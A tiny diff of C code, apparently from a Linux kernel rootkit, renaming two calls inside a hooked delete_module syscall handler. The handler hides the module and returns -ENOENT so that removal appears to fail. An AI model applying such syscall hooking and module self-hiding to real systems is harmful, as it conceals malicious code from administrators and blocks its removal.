@@ -31,8 +31,8 @@ static long __x64_sys_delete_module_hook(const struct pt_regs *regs)
          * the original syscall from returning back here, but I feel it's
          * unnecessary at this point.
          */
-        hide_unset_module_this();
-        hide_hook_unset_delete_module();
+        hide_disable_thismodule();
+        hide_hook_disable_delete_module();
         return -ENOENT;
     }
 
